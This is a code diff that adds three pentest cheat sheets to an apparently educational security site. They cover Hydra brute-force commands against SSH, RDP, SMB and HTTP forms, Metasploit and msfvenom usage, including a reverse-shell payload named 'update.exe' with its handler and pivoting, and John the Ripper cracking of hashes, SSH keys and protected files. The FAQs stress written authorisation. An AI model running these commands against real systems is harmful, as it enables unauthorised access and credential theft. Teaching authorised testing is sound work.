@@ -1223,6 +1223,105 @@ export const CHEATSHEETS = [
       { label: 'Phishing URL Scanner', url: '/url-scanner' },
       { label: 'HTTP Requests & Responses Lesson', url: '/learning/cyber-security/cyber-security-track/http-https-request-response' }
     ]
+  },
+  {
+    slug: 'hydra-brute-force-cheatsheet',
+    title: 'Hydra Cheat Sheet: SSH, HTTP Form & Service Brute-Force Commands',
+    shortTitle: 'Hydra Brute-Force Cheat Sheet',
+    category: 'Network & Pentest',
+    summary: 'Copy-ready Hydra commands for SSH, FTP, RDP, SMB and HTTP form logins: single-user and user-list modes, HTTP POST form syntax, thread control, resume files and the lockout risks that end an engagement early.',
+    commands: [
+      { title: 'SSH, Single User, Password List', desc: 'The default shape: one known username, a password wordlist, four parallel tasks.', cmd: 'hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://{TARGET} -t 4' },
+      { title: 'SSH, Known Username List and Password List', desc: 'Both lists supplied with -L and -P. Use -f to stop at the first valid pair instead of continuing.', cmd: 'hydra -L users.txt -P pass.txt ssh://{TARGET} -f -t 4 -V' },
+      { title: 'Username Equals Password (Password Spray)', desc: 'The -e nsr flag tries an empty password (n), the username as the password (s), and the reversed username (r) before the wordlist.', cmd: 'hydra -L users.txt -e nsr ssh://{TARGET} -t 2 -f' },
+      { title: 'FTP With a Port Override', desc: 'Pass -s when the service is not on its default port; the scheme keyword stays the same.', cmd: 'hydra -l admin -P pass.txt -s 2121 ftp://{TARGET} -t 4' },
+      { title: 'HTTP POST Form Login', desc: 'The three-part syntax is path:body:fail-string. Hydra needs a string that appears only on a failed login, so capture a bad login first.', cmd: 'hydra -l admin -P pass.txt {TARGET} http-post-form "/login.php:user=^USER^&pass=^PASS^:Invalid credentials" -t 4' },
+      { title: 'HTTP Form With a Hidden CSRF Token', desc: 'Tokens break naive brute-force. Grab a fresh token, then use the :s= option to send the cookie captured during the initial GET.', cmd: 'hydra -l admin -P pass.txt {TARGET} http-post-form "/login:user=^USER^&pass=^PASS^&csrf=TOKEN:F=Invalid" -t 1' },
+      { title: 'HTTP Basic Auth', desc: 'Tests an Authorization: Basic header rather than a form; common on staging panels and internal tools.', cmd: 'hydra -l admin -P pass.txt {TARGET} http-get /admin/ -t 4' },
+      { title: 'RDP Against a Windows Host', desc: 'Slow and loud, and Windows will lock accounts. Lower the thread count and confirm the lockout policy before running.', cmd: 'hydra -l administrator -P pass.txt rdp://{TARGET} -t 1 -W 5' },
+      { title: 'SMB With a Domain', desc: 'Pass the domain with -m so the authentication request is formed correctly.', cmd: 'hydra -l administrator -P pass.txt {TARGET} smb -m DOMAIN -t 1' },
+      { title: 'Resume an Interrupted Run', desc: 'Hydra writes a restore file; -R continues from where it stopped instead of redoing every attempt.', cmd: 'hydra -R hydra.restore' },
+      { title: 'Bound the Attempts and Slow Down', desc: 'Cap total tries with -M and add a delay with -W to stay under a rate limit or an account lockout threshold.', cmd: 'hydra -l admin -P pass.txt ssh://{TARGET} -t 1 -W 10 -M 20' },
+      { title: 'Write Results to a File', desc: 'Keep the hits out of scrollback: -o writes valid credential pairs as it finds them.', cmd: 'hydra -L users.txt -P pass.txt ssh://{TARGET} -o hydra-hits.txt -f' }
+    ],
+    faqs: [
+      { q: 'Why does Hydra report every credential as valid?', a: 'The failure string does not appear on a failed login, so every response looks like a success. Log in once with a deliberately wrong password, capture the exact text or status code the server returns, and use that as the fail condition - or use F= / S= to match a status code instead of body text.' },
+      { q: 'How many threads are safe?', a: 'One or two against anything with an account lockout policy, and never more than the target can tolerate. Hydra\'s default of 16 is tuned for speed, not for staying undetected or for keeping an account unlocked. You only need one valid credential; a locked domain administrator account and a hundred thousand failed attempts is a worse outcome than a slow scan.' },
+      { q: 'What is the difference between ^USER^ and ^PASS^?', a: 'They are placeholders Hydra substitutes from the -l/-L and -p/-P lists. Without them in the form body, the same static request is sent for every attempt, which produces a uniform failure and a report full of false positives.' },
+      { q: 'Can Hydra get past a CSRF token or a captcha?', a: 'Not on its own. A per-request token has to be fetched and injected, which Hydra handles only awkwardly and slowly; a captcha stops it entirely. At that point the realistic finding is the absence of rate limiting on the login endpoint - report the weakness rather than forcing the tool.' },
+      { q: 'Is brute-forcing a login lawful?', a: 'Only with written authorisation that names the target and the allowed method. Password guessing against a system you do not own is unauthorised access in most jurisdictions, and it is one of the fastest ways to get an engagement terminated when it locks a production account.' }
+    ],
+    relatedLinks: [
+      { label: 'Hydra Pentest Guide', url: '/pentest/hydra' },
+      { label: 'Password Attacks Over the Network', url: '/learning/cyber-security/cyber-security-track/password-attacks-over-the-network' },
+      { label: 'John the Ripper Cheat Sheet', url: '/cheatsheets/john-the-ripper-cheatsheet' }
+    ]
+  },
+  {
+    slug: 'metasploit-command-cheatsheet',
+    title: 'Metasploit Cheat Sheet: msfconsole, Modules & Meterpreter Commands',
+    shortTitle: 'Metasploit Command Cheat Sheet',
+    category: 'Network & Pentest',
+    summary: 'Copy-ready msfconsole commands for searching and running modules, configuring options, managing sessions, and using msfvenom - plus the database setup that makes search fast and the realism check on what a payload actually gets past.',
+    commands: [
+      { title: 'Start Console and Connect the Database', desc: 'The database makes search and the hosts/services/sessions tables work; without it you are using a fraction of the tool.', cmd: 'sudo msfdb init && msfconsole -q' },
+      { title: 'Search Modules by CVE, Platform or Keyword', desc: 'Search across exploits, auxiliary, payloads and post modules at once.', cmd: 'msf> search cve:2024-3400\nmsf> search type:auxiliary platform:linux smb' },
+      { title: 'Select a Module and Read It', desc: 'info prints the description, the options and the references before you run anything.', cmd: 'msf> use exploit/linux/http/example\nmsf> info' },
+      { title: 'Set Options and Check Before Running', desc: 'check asks the target whether it looks vulnerable without firing the exploit; it is not implemented for every module.', cmd: 'msf> set RHOSTS {TARGET}\nmsf> set LHOST {LHOST}\nmsf> set LPORT 4444\nmsf> check\nmsf> run' },
+      { title: 'Run Against Many Hosts', desc: 'RHOSTS accepts a range, a CIDR block or a file of addresses.', cmd: 'msf> set RHOSTS 10.10.10.0/24\nmsf> set THREADS 10\nmsf> run' },
+      { title: 'List and Interact With Sessions', desc: 'Every opened session gets an id; interact with it or background it and keep scanning.', cmd: 'msf> sessions -l\nmsf> sessions -i 1\nmeterpreter> background' },
+      { title: 'Route Traffic Through a Session', desc: 'Turn a foothold into a pivot so other modules can reach an internal subnet.', cmd: 'msf> use post/multi/manage/autoroute\nmsf> set SESSION 1\nmsf> run\nmsf> setg RHOSTS 172.16.1.0/24' },
+      { title: 'Generate a Payload With msfvenom', desc: 'Choose the payload, the output format and the local address the payload will call back to.', cmd: 'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={LHOST} LPORT=443 -f exe -o update.exe' },
+      { title: 'Start the Matching Handler', desc: 'A payload needs something listening. multi/handler with the same payload and ports is the pairing.', cmd: 'msf> use exploit/multi/handler\nmsf> set PAYLOAD windows/x64/meterpreter/reverse_tcp\nmsf> set LHOST {LHOST}\nmsf> set LPORT 443\nmsf> run -j' },
+      { title: 'Save and Reload Workspaces', desc: 'Separate engagements into workspaces so hosts, loot and credentials do not mix.', cmd: 'msf> workspace -a client-a\nmsf> workspace\nmsf> db_import /path/to/nmap.xml' },
+      { title: 'Pull the Loot Together', desc: 'Hosts, services, credentials and loot collected during the session, ready for the report.', cmd: 'msf> hosts\nmsf> services\nmsf> creds\nmsf> loot' },
+      { title: 'Quiet Batch Mode for One-Off Runs', desc: '-x runs a command string without an interactive console, which is what a scripted lab run wants.', cmd: 'msfconsole -q -x "use auxiliary/scanner/smb/smb_version; set RHOSTS {TARGET}; run; exit"' }
+    ],
+    faqs: [
+      { q: 'Why does my payload get blocked immediately?', a: 'Because a stock msfvenom binary is one of the most widely signatured files on the internet; every endpoint product has seen the default templates for years. That is a detection result, not an evasion puzzle - in an authorised test, report that the endpoint control works. Building your own loader is a different activity with a different scope.' },
+      { q: 'Does check actually tell me the target is vulnerable?', a: 'Only sometimes. check is implemented per module and many simply do not have one; those that do often rely on a version banner, which backported patches make unreliable. Treat check as a hint and verify the finding another way before writing it up.' },
+      { q: 'What is the difference between a staged and a stageless payload?', a: 'A staged payload (windows/x64/meterpreter/reverse_tcp) is a small stager that connects back and downloads the rest, so the initial file is tiny but needs a listener that can serve the second stage. A stageless payload (…/meterpreter_reverse_tcp) carries everything in one file, which is larger and behaves identically once it runs.' },
+      { q: 'Why did my reverse shell never connect?', a: 'In order of frequency: LHOST was set to a private address the target cannot route to, the port was blocked outbound, the handler was not running or was on a different payload, or the target has no egress except through a proxy. Confirm the handler is listening locally before blaming the target.' },
+      { q: 'Is running an exploit module lawful?', a: 'Only inside written authorisation that names the hosts and the techniques. Exploitation can crash a service, corrupt data or leave a system unusable, so an authorised test also includes agreeing what happens when that occurs.' }
+    ],
+    relatedLinks: [
+      { label: 'Metasploit Pentest Guide', url: '/pentest/metasploit' },
+      { label: 'Exploitation Concepts Lesson', url: '/learning/cyber-security/cyber-security-track/exploitation-concepts-without-exploiting-anyone' },
+      { label: 'nmap vs RustScan Comparison', url: '/compare/nmap-vs-rustscan' }
+    ]
+  },
+  {
+    slug: 'john-the-ripper-cheatsheet',
+    title: 'John the Ripper Cheat Sheet: Cracking Modes, Rules & Converters',
+    shortTitle: 'John the Ripper Cheat Sheet',
+    category: 'Password Security',
+    summary: 'Copy-ready John the Ripper commands: wordlist, rule-based mangling and incremental modes; the *2john converters for SSH keys, ZIP, PDF and Office files; format detection, session restore and --show.',
+    commands: [
+      { title: 'Crack With a Wordlist', desc: 'The default first pass. John auto-detects the hash format from the file.', cmd: 'john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt' },
+      { title: 'Add Rule-Based Mangling', desc: '--rules applies transformations - capitalisation, leetspeak, appending digits - so one word covers many candidates.', cmd: 'john --wordlist=rockyou.txt --rules hashes.txt' },
+      { title: 'Brute Force Without a Wordlist', desc: 'Incremental mode walks the keyspace. Powerful and slow; use it last and with a time limit.', cmd: 'john --incremental hashes.txt --max-run-time=3600' },
+      { title: 'Show What Was Cracked', desc: 'Without --show, John resumes the session rather than reporting. This is the command people forget.', cmd: 'john --show hashes.txt' },
+      { title: 'Force a Specific Format', desc: 'Needed when auto-detection guesses wrong, or when you know exactly what you are looking at.', cmd: 'john --format=sha512crypt hashes.txt --wordlist=rockyou.txt' },
+      { title: 'Crack an SSH Private Key', desc: 'Convert the key to a John-friendly hash first - ssh2john ships with the Jumbo build.', cmd: 'ssh2john id_rsa > id_rsa.hash && john --wordlist=rockyou.txt id_rsa.hash' },
+      { title: 'Crack a Password-Protected ZIP', desc: 'zip2john extracts the hash from the archive, which is the only part John needs.', cmd: 'zip2john archive.zip > zip.hash && john --wordlist=rockyou.txt zip.hash' },
+      { title: 'Crack a Protected PDF', desc: 'pdf2john is slow on large documents; extract the hash once and reuse it.', cmd: 'pdf2john protected.pdf > pdf.hash && john --wordlist=rockyou.txt pdf.hash' },
+      { title: 'Crack Office Documents', desc: 'office2john handles the modern OOXML containers; older binary formats need a different converter.', cmd: 'office2john report.docx > office.hash && john --wordlist=rockyou.txt office.hash' },
+      { title: 'Use Every CPU Core', desc: 'Fork a worker per core; John does not saturate the machine on its own.', cmd: 'john --format=raw-sha256 --fork=4 --wordlist=rockyou.txt hashes.txt' },
+      { title: 'Resume an Interrupted Session', desc: 'Sessions are recoverable by name; restore continues instead of restarting the search.', cmd: 'john --session=lab1 hashes.txt && john --restore=lab1' },
+      { title: 'Build a Custom Rule File', desc: 'Write mangling rules once, reuse them across engagements instead of retyping the variants.', cmd: 'john --wordlist=base.txt --rules=MyRules hashes.txt   # rules live in john.conf' }
+    ],
+    faqs: [
+      { q: 'Why is John not finding a hash that hashcat cracks instantly?', a: 'Almost always the build. The "core" version packaged by some distributions supports a small set of formats and no GPU; the Jumbo build supports hundreds of formats and includes the *2john converters. Check with john --list=formats before assuming the hash is unusual.' },
+      { q: 'What is the difference between John and hashcat?', a: 'John excels at breadth - hundreds of formats and a converter for almost every file type you will meet - and runs on the CPU. hashcat is built for GPU throughput and wins decisively on raw speed for common fast hashes. In practice: use John when you have an odd format, hashcat when you have a lot of hashes of a known type.' },
+      { q: 'Why does --show return nothing when something was cracked?', a: 'You are pointing at a different file than the run that cracked it, or the hash file was edited in between so the line no longer matches. John stores results in ~/.john/john.pot keyed on the ciphertext; deleting that file loses the history, not the hashes.' },
+      { q: 'How long will a password take to crack?', a: 'That depends on the hash type, the candidate space and the hardware - and on nothing else. A fast hash such as unsalted MD5 is effectively transparent for short passwords; bcrypt, scrypt and Argon2id are designed so that each guess costs real time. Use the site calculator to reason about entropy rather than trusting a table of "seconds to crack".' },
+      { q: 'Is cracking a hash lawful?', a: 'Only for hashes you are entitled to test: your own, your lab\'s, or a client\'s under written authorisation. Hashes from a breach dump are someone else\'s data, and attacking live accounts with recovered passwords is a criminal act regardless of how the hash was obtained.' }
+    ],
+    relatedLinks: [
+      { label: 'John the Ripper Pentest Guide', url: '/pentest/john-the-ripper' },
+      { label: 'Hashcat Pentest Guide', url: '/pentest/hashcat' },
+      { label: 'Hashing, Salting & Password Storage', url: '/learning/cyber-security/cyber-security-track/hashing-salting-password-storage' }
+    ]
   }
 ];
 
